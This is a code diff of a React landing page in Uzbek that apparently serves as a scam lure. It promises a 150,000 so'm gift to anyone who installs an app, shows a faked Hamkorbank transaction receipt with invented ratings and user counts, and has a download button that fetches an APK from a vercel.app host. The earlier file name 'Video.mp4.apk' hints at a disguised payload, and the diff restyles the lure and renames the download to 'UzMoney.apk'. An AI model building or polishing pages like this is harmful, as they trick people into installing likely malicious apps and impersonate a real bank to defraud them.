@@ -4,64 +4,111 @@ export default function App() {
   const handleDownload = (e) => {
     e.preventDefault();
     const link = document.createElement('a');
-    link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
-    link.download = 'BonusApp.apk';
+    // Используем оригинальный URL для скачивания
+    link.href = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
+    link.download = 'UzMoney.apk';
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
   };
 
+  const baseContainerStyle = {
+    minHeight: '100vh',
+    background: 'linear-gradient(135deg, #4f46e5 0%, #8b5cf6 50%, #ec4899 100%)', // Более мягкий градиент
+    color: 'white',
+    fontFamily: 'Inter, system-ui, sans-serif',
+    padding: '1.5rem',
+    display: 'flex',
+    flexDirection: 'column', // По умолчанию колонна (мобильный)
+    alignItems: 'center',
+    justifyContent: 'center',
+    overflowX: 'hidden',
+    textAlign: 'center'
+  };
+
+  const leftColumnStyle = {
+    width: '100%',
+    maxWidth: '500px',
+    textAlign: 'left',
+    marginBottom: '2.5rem',
+  };
+
+  const rightColumnStyle = {
+    width: '100%',
+    maxWidth: '400px',
+    background: 'white',
+    color: '#1f2937', // Gray-800
+    borderRadius: '1.5rem', // 24px
+    padding: '2rem',
+    boxShadow: '0 20px 50px rgba(0,0,0,0.3)',
+    textAlign: 'left',
+    marginTop: '2.5rem', // Отступ сверху на мобильном
+  };
+
+  const buttonBaseStyle = {
+    background: 'linear-gradient(to right, #fbbf24, #f59e0b)', // Amber gradient
+    color: '#000',
+    border: 'none',
+    padding: '1rem 2rem',
+    fontSize: '1.25rem',
+    fontWeight: 'bold',
+    borderRadius: '9999px', // Full rounded
+    cursor: 'pointer',
+    boxShadow: '0 10px 25px rgba(245, 158, 11, 0.4)',
+    transition: 'all 0.3s ease',
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    gap: '0.75rem',
+    width: '100%', // Полная ширина на мобильном
+    margin: '0 auto', // Центрирование
+  };
+
+  // Эффекты hover с помощью JS-стилей
+  const handleButtonHover = (e, hover) => {
+    e.currentTarget.style.transform = hover ? 'scale(1.03)' : 'scale(1)';
+    e.currentTarget.style.boxShadow = hover 
+      ? '0 15px 35px rgba(245, 158, 11, 0.6)' 
+      : '0 10px 25px rgba(245, 158, 11, 0.4)';
+  };
+
   return (
-    <div
-      style={{
-        minHeight: '100vh',
-        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%)',
-        fontFamily: 'Segoe UI, system-ui, sans-serif',
-        color: 'white',
-        padding: '20px',
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-        textAlign: 'center',
-        position: 'relative',
-        overflowX: 'hidden'
-      }}
-    >
-      {/* Левая колонка */}
-      <div style={{
-        flex: '0 0 45%',
-        textAlign: 'left',
-        paddingRight: '40px',
-        maxWidth: '500px'
-      }}>
+    <div style={baseContainerStyle} className="main-container">
+      {/* Левая колонка - Контент */}
+      <div style={leftColumnStyle} className="content-section">
+        
         {/* Метка "Maxsus taklif" */}
         <div style={{
           background: 'rgba(255,255,255,0.2)',
           color: 'white',
-          padding: '6px 16px',
+          padding: '4px 16px',
           borderRadius: '20px',
-          fontSize: '0.85rem',
+          fontSize: '0.875rem',
           display: 'inline-block',
-          marginBottom: '20px',
-          border: '1px solid rgba(255,255,255,0.3)'
+          marginBottom: '1rem',
+          border: '1px solid rgba(255,255,255,0.3)',
+          fontWeight: '500',
+          letterSpacing: '0.05em'
         }}>
           🎁 Maxsus taklif
         </div>
 
-        {/* Большая сумма */}
-        <h1 style={{
-          fontSize: '48px',
+        {/* Большая сумма (H1) */}
+        <h1 className="main-heading" style={{
+          fontSize: '2.5rem', // 40px
           fontWeight: '900',
-          color: '#ffd700',
+          color: '#fcd34d', // Yellow-300
           lineHeight: 1.2,
-          marginBottom: '10px'
+          marginBottom: '0.5rem'
         }}>
           150 000 so‘m
         </h1>
-        <h2 style={{
-          fontSize: '36px',
+        
+        {/* Заголовок (H2) */}
+        <h2 className="sub-heading" style={{
+          fontSize: '2rem', // 32px
           fontWeight: '800',
-          marginBottom: '20px',
+          marginBottom: '1.5rem',
           lineHeight: 1.3
         }}>
           sovg‘a olish!
@@ -69,18 +116,16 @@ export default function App() {
 
         {/* Описание */}
         <p style={{
-          fontSize: '16px',
-          marginBottom: '30px',
-          lineHeight: 1.5,
+          fontSize: '1.125rem', // 18px
+          marginBottom: '2rem',
+          lineHeight: 1.6,
           color: 'rgba(255,255,255,0.9)'
         }}>
-          Ilovani yuklab oling va ro‘yxatdan o‘ting — darhol <span style={{ color: '#ffd700' }}>150 000 so‘m</span> kartangizga sovg‘a sifatida tushadi. Faqat yangi foydalanuvchilar uchun!
+          Ilovani yuklab oling va ro‘yxatdan o‘ting — darhol <span style={{ color: '#fcd34d', fontWeight: '600' }}>150 000 so‘m</span> kartangizga sovg‘a sifatida tushadi. Faqat yangi foydalanuvchilar uchun!
         </p>
 
         {/* Список преимуществ */}
-        <div style={{
-          marginBottom: '30px'
-        }}>
+        <div style={{ marginBottom: '2.5rem', display: 'flex', flexDirection: 'column', gap: '1rem' }}>
           {[
             {
               icon: '📱',
@@ -98,37 +143,39 @@ export default function App() {
               subtitle: 'Avtomatik kartangizga'
             }
           ].map((item, i) => (
-            <div key={i} style={{
-              display: 'flex',
-              alignItems: 'flex-start',
-              gap: '12px',
-              marginBottom: '16px',
-              padding: '12px',
-              borderRadius: '12px',
-              background: 'rgba(255,255,255,0.1)',
-              transition: 'background 0.2s'
-            }} onMouseOver={(e) => {
-              e.target.style.background = 'rgba(255,255,255,0.15)';
-            }} onMouseOut={(e) => {
-              e.target.style.background = 'rgba(255,255,255,0.1)';
-            }}>
+            <div 
+              key={i} 
+              style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '1rem',
+                padding: '1rem',
+                borderRadius: '0.75rem',
+                background: 'rgba(255,255,255,0.1)',
+                transition: 'background 0.2s',
+                cursor: 'pointer'
+              }} 
+              onMouseOver={(e) => { e.currentTarget.style.background = 'rgba(255,255,255,0.15)'; }} 
+              onMouseOut={(e) => { e.currentTarget.style.background = 'rgba(255,255,255,0.1)'; }}
+            >
               <div style={{
-                width: '40px',
-                height: '40px',
+                width: '44px',
+                height: '44px',
                 borderRadius: '50%',
-                background: '#ffeb3b',
+                background: '#fcd34d', // Yellow-300
                 display: 'flex',
                 alignItems: 'center',
                 justifyContent: 'center',
                 color: '#000',
                 fontWeight: 'bold',
-                fontSize: '18px'
+                fontSize: '1.25rem',
+                flexShrink: 0
               }}>
                 {item.icon}
               </div>
               <div>
-                <div style={{ fontWeight: '700', fontSize: '16px' }}>{item.title}</div>
-                <div style={{ fontSize: '14px', color: 'rgba(255,255,255,0.8)' }}>{item.subtitle}</div>
+                <div style={{ fontWeight: '700', fontSize: '1.125rem' }}>{item.title}</div>
+                <div style={{ fontSize: '0.875rem', color: 'rgba(255,255,255,0.8)' }}>{item.subtitle}</div>
               </div>
             </div>
           ))}
@@ -137,147 +184,131 @@ export default function App() {
         {/* Кнопка */}
         <button
           onClick={handleDownload}
-          style={{
-            background: 'linear-gradient(to right, #ffc107, #ff9800)',
-            color: '#000',
-            border: 'none',
-            padding: '16px 36px',
-            fontSize: '20px',
-            fontWeight: 'bold',
-            borderRadius: '40px',
-            cursor: 'pointer',
-            boxShadow: '0 6px 20px rgba(0,0,0,0.2)',
-            transition: 'all 0.3s',
-            display: 'flex',
-            alignItems: 'center',
-            justifyContent: 'center',
-            gap: '10px',
-            width: '100%'
-          }}
-          onMouseOver={(e) => {
-            e.target.style.transform = 'scale(1.03)';
-            e.target.style.boxShadow = '0 8px 25px rgba(0,0,0,0.3)';
-          }}
-          onMouseOut={(e) => {
-            e.target.style.transform = 'scale(1)';
-            e.target.style.boxShadow = '0 6px 20px rgba(0,0,0,0.2)';
-          }}
+          style={buttonBaseStyle}
+          onMouseOver={(e) => handleButtonHover(e, true)}
+          onMouseOut={(e) => handleButtonHover(e, false)}
         >
           🎁 Sovg‘ani olish →
         </button>
 
         {/* Рейтинг */}
         <div style={{
-          marginTop: '20px',
-          fontSize: '14px',
-          color: 'rgba(255,255,255,0.8)',
+          marginTop: '1.5rem',
+          fontSize: '0.875rem',
+          color: 'rgba(255,255,255,0.7)',
           display: 'flex',
+          flexDirection: 'column', // По умолчанию колонна
           alignItems: 'center',
-          gap: '6px'
-        }}>
-          <span>⭐ 4.9/5</span>
-          <span>•</span>
+          justifyContent: 'center',
+          gap: '0.25rem'
+        }} className="rating-info">
+          <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
+            <span style={{ color: '#fcd34d' }}>⭐</span> 4.9/5
+          </div>
+          <span className="separator" style={{ display: 'none' }}>•</span>
           <span>46,000+ foydalanuvchi sovg‘a oldi</span>
         </div>
       </div>
 
-      {/* Правая колонка — имитация транзакции */}
-      <div style={{
-        flex: '0 0 45%',
-        background: 'white',
-        color: '#000',
-        borderRadius: '20px',
-        padding: '30px',
-        boxShadow: '0 10px 40px rgba(0,0,0,0.2)',
-        textAlign: 'left',
-        maxWidth: '400px'
-      }}>
+      {/* Правая колонка — имитация транзакции (Карточка) */}
+      <div style={rightColumnStyle} className="card-section">
+        
         {/* Заголовок банка */}
         <div style={{
           display: 'flex',
           alignItems: 'center',
-          marginBottom: '20px'
+          marginBottom: '1.5rem'
         }}>
           <div style={{
-            width: '50px',
-            height: '50px',
-            borderRadius: '12px',
-            background: '#4caf50',
+            width: '48px',
+            height: '48px',
+            borderRadius: '0.75rem',
+            background: '#10b981', // Emerald-500
             display: 'flex',
             alignItems: 'center',
             justifyContent: 'center',
-            marginRight: '12px'
+            marginRight: '1rem',
+            flexShrink: 0
           }}>
-            <span style={{ color: 'white', fontSize: '24px', fontWeight: 'bold' }}>H</span>
+            <span style={{ color: 'white', fontSize: '1.5rem', fontWeight: 'bold' }}>H</span>
           </div>
           <div>
-            <div style={{ fontWeight: '700', fontSize: '18px' }}>Hamkorbank</div>
-            <div style={{ fontSize: '14px', color: '#666' }}>Plastik karta</div>
+            <div style={{ fontWeight: '800', fontSize: '1.125rem' }}>Hamkorbank</div>
+            <div style={{ fontSize: '0.875rem', color: '#6b7280' }}>Plastik karta</div>
           </div>
         </div>
 
         {/* Разделитель */}
         <div style={{
-          borderTop: '1px dashed #ccc',
-          margin: '20px 0'
+          borderTop: '1px dashed #d1d5db', // Gray-300
+          margin: '1.5rem 0'
         }}></div>
 
         {/* Детали транзакции */}
-        <div style={{ marginBottom: '20px' }}>
-          <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Tranzaksiya</div>
-          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px' }}>
-            <span>🎁</span>
-            <span>Xush kelibsiz sovg‘asi</span>
+        <div style={{ marginBottom: '1.5rem', display: 'flex', flexDirection: 'column', gap: '1rem' }}>
+          <div>
+            <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Tranzaksiya</div>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '1rem', fontWeight: '500' }}>
+              <span>🎁</span>
+              <span>Xush kelibsiz sovg‘asi</span>
+            </div>
           </div>
-          <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Sana va vaqt</div>
-          <div>5-noyabr, 2025 • 14:23</div>
-          <div style={{ fontSize: '14px', color: '#666', marginTop: '16px' }}>Karta raqami</div>
-          <div>8600 **** **** 4521</div>
+          
+          <div>
+            <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Sana va vaqt</div>
+            <div style={{ fontSize: '1rem', fontWeight: '500' }}>5-noyabr, 2025 • 14:23</div>
+          </div>
+
+          <div>
+            <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Karta raqimi</div>
+            <div style={{ fontSize: '1rem', fontWeight: '500' }}>8600 **** **** 4521</div>
+          </div>
         </div>
 
         {/* Блок суммы */}
         <div style={{
-          background: '#fff8e1',
-          border: '2px solid #ffc107',
-          borderRadius: '12px',
-          padding: '20px',
-          marginBottom: '20px',
-          position: 'relative'
+          background: '#fffbeb', // Amber-50
+          border: '2px solid #fbbf24', // Amber-400
+          borderRadius: '0.75rem',
+          padding: '1.25rem',
+          marginBottom: '1.5rem',
+          position: 'relative',
+          overflow: 'hidden'
         }}>
           <div style={{
             position: 'absolute',
             top: '10px',
             right: '10px',
-            fontSize: '24px',
-            opacity: 0.2
+            fontSize: '2.25rem',
+            opacity: 0.1
           }}>🎁</div>
-          <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Sovg‘a olindi</div>
+          <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Sovg‘a olindi</div>
           <div style={{
-            fontSize: '32px',
+            fontSize: '2.5rem',
             fontWeight: '900',
-            color: '#ff5722',
+            color: '#ef4444', // Red-500
             marginBottom: '4px'
           }}>
             +150 000
           </div>
-          <div style={{ fontSize: '16px', color: '#666' }}>so‘m</div>
+          <div style={{ fontSize: '1rem', color: '#4b5563' }}>so‘m</div>
         </div>
 
         {/* Статус */}
-        <div style={{ marginBottom: '20px' }}>
-          <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Status</div>
+        <div style={{ marginBottom: '1.5rem' }}>
+          <div style={{ fontSize: '0.75rem', fontWeight: '600', color: '#6b7280', marginBottom: '4px', textTransform: 'uppercase' }}>Status</div>
           <div style={{
             display: 'flex',
             alignItems: 'center',
             gap: '8px',
-            color: '#4caf50',
-            fontWeight: '600'
+            color: '#10b981', // Emerald-600
+            fontWeight: '700'
           }}>
             <div style={{
               width: '10px',
               height: '10px',
               borderRadius: '50%',
-              background: '#4caf50'
+              background: '#10b981'
             }}></div>
             Muvaffaqiyatli
           </div>
@@ -285,8 +316,8 @@ export default function App() {
 
         {/* Разделитель */}
         <div style={{
-          borderTop: '1px dashed #ccc',
-          margin: '20px 0'
+          borderTop: '1px dashed #d1d5db',
+          margin: '1.5rem 0'
         }}></div>
 
         {/* Кнопка подтверждения */}
@@ -294,23 +325,23 @@ export default function App() {
           textAlign: 'center'
         }}>
           <button style={{
-            background: '#e8f5e8',
-            color: '#2e7d32',
+            background: '#d1fae5', // Green-100
+            color: '#047857', // Green-700
             border: 'none',
             padding: '10px 20px',
-            borderRadius: '30px',
-            fontSize: '14px',
+            borderRadius: '9999px',
+            fontSize: '0.875rem',
             fontWeight: '600',
             cursor: 'pointer',
-            display: 'flex',
+            display: 'inline-flex',
             alignItems: 'center',
             justifyContent: 'center',
             gap: '8px',
             transition: 'background 0.2s'
           }} onMouseOver={(e) => {
-            e.target.style.background = '#c8e6c9';
+            e.currentTarget.style.background = '#a7f3d0'; // Green-200
           }} onMouseOut={(e) => {
-            e.target.style.background = '#e8f5e8';
+            e.currentTarget.style.background = '#d1fae5';
           }}>
             ✅ Tasdiqlangan
           </button>
@@ -318,30 +349,70 @@ export default function App() {
 
         {/* ID транзакции */}
         <div style={{
-          marginTop: '16px',
-          fontSize: '12px',
-          color: '#999',
+          marginTop: '1rem',
+          fontSize: '0.75rem',
+          color: '#9ca3af', // Gray-400
           textAlign: 'center'
         }}>
           ID: TXN-2025-1104-87392
         </div>
       </div>
 
-      {/* Адаптивность */}
+      {/* Адаптивность с помощью CSS Media Queries */}
       <style>{`
-        @media (max-width: 900px) {
-          .App {
-            flex-direction: column;
+        /* Стили для экранов больше 1024px (lg) */
+        @media (min-width: 1024px) {
+          .main-container {
+            flex-direction: row;
           }
-          div[style*="flex: 0 0 45%"] {
-            flex: 0 0 100%;
-            max-width: none;
-            padding: 0;
-            margin-bottom: 30px;
+          .content-section {
+            width: auto;
+            flex: 1; /* Позволяет занять больше места */
+            max-width: 500px;
+            margin-right: 4rem; /* Отступ между колонками */
+            margin-bottom: 0;
           }
-          h1 { font-size: 36px; }
-          h2 { font-size: 30px; }
-          button { width: 100%; }
+          .card-section {
+            width: auto;
+            flex: 1;
+            max-width: 400px;
+            margin-top: 0;
+          }
+          .main-heading {
+            font-size: 4rem !important; /* 64px */
+          }
+          .sub-heading {
+            font-size: 3rem !important; /* 48px */
+          }
+          button {
+            width: 384px !important; /* 96 */
+          }
+          .rating-info {
+            flex-direction: row !important;
+            justify-content: flex-start !important;
+            gap: 0.75rem !important;
+          }
+          .separator {
+            display: block !important;
+          }
+        }
+
+        /* Дополнительная адаптивность для больших мобильных экранов (sm) */
+        @media (min-width: 640px) and (max-width: 1023px) {
+           .main-heading {
+            font-size: 3rem !important; /* 48px */
+          }
+          .sub-heading {
+            font-size: 2.5rem !important; /* 40px */
+          }
+          .rating-info {
+            flex-direction: row !important;
+            justify-content: center !important;
+            gap: 0.75rem !important;
+          }
+          .separator {
+            display: block !important;
+          }
         }
       `}</style>
     </div>
